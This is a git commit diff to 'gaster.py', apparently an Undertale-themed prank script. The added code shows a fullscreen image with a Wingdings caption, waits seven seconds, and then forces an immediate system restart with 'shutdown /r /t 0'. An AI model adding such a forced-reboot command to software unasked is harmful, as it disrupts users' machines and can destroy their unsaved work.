0db1848f6a694bd127fc68495d57ac8c5db2dcda
Lilith/3 <laylagruszka123@gmail.com>
2025-09-18 18:12:58 +0100

    Added gaster image display and 7s timer.

--- gaster.py
+++ gaster.py
@@ -1,9 +1,20 @@
-# Importing the keyboard module which will acess the inputs from the keyboard
 import keyboard
 import os
 import pygame
+import time
 
 def restart():
+    pygame.init()
+
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    pygame.display.set_caption("🕈︎☟︎✡︎ ❄︎☞︎ 👎︎✋︎👎︎ 🕆︎ ❄︎☼︎✌︎☠︎💧︎☹︎✌︎❄︎☜︎ ❄︎☟︎✋︎💧︎ 🖳︎🕿︎🕿︎🕿︎🕿︎")
+
+    image = pygame.image.load("gayster.jpg")
+    screen.blit(image, (0, 0))
+
+    pygame.display.flip()
+    time.sleep(7) # added a second more to have some silence after the recoding. It's funny lol
+
     if os.name == 'nt':
         os.system("shutdown /r /t 0")
     else:
